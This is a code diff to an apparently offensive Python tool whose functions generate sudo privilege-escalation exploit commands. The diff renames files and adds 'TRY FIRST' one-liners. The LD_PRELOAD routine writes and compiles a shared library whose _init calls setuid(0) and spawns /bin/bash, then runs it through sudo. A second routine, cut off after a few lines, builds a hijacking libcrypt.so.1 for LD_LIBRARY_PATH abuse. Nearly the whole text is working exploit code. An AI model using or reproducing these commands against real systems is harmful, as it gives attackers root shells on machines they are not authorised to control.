@@ -60,18 +60,24 @@ def _parse_first_sudo_command(section_text: str) -> Tuple[Optional[str], bool]:
 def generate_ld_preload_commands(sudo_command: str) -> List[str]:
     """Generate LD_PRELOAD shared-library exploit steps for the given sudo command."""
     return [
-        "echo '#include <stdio.h>' > /tmp/preload.c",
-        "echo '#include <sys/types.h>' >> /tmp/preload.c",
-        "echo '#include <stdlib.h>' >> /tmp/preload.c",
-        'echo \'void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }\' >> /tmp/preload.c',
-        "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c",
-        f"sudo LD_PRELOAD=/tmp/preload.so {sudo_command}",
+        # One-liner TRY FIRST: assumes shell.c already written (or run steps below first)
+        f"gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles && sudo LD_PRELOAD=/tmp/shell.so {sudo_command}",
+        # Step-by-step: write C source then compile and run
+        "echo '#include <stdio.h>' > /tmp/shell.c",
+        "echo '#include <sys/types.h>' >> /tmp/shell.c",
+        "echo '#include <stdlib.h>' >> /tmp/shell.c",
+        'echo \'void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }\' >> /tmp/shell.c',
+        "gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c",
+        f"sudo LD_PRELOAD=/tmp/shell.so {sudo_command}",
     ]
 
 
 def generate_ld_library_path_commands(sudo_command: str) -> List[str]:
     """Generate LD_LIBRARY_PATH shared-library exploit steps for the given sudo command."""
     return [
+        # One-liner TRY FIRST: assumes libcrypt.c already written (or run steps below first)
+        f"gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c && sudo LD_LIBRARY_PATH=/tmp {sudo_command}",
+        # Step-by-step: write C source then compile and run
         "echo '#include <stdio.h>' > /tmp/libcrypt.c",
         "echo '#include <stdlib.h>' >> /tmp/libcrypt.c",
         "echo 'static void hijack() __attribute__((constructor));' >> /tmp/libcrypt.c",
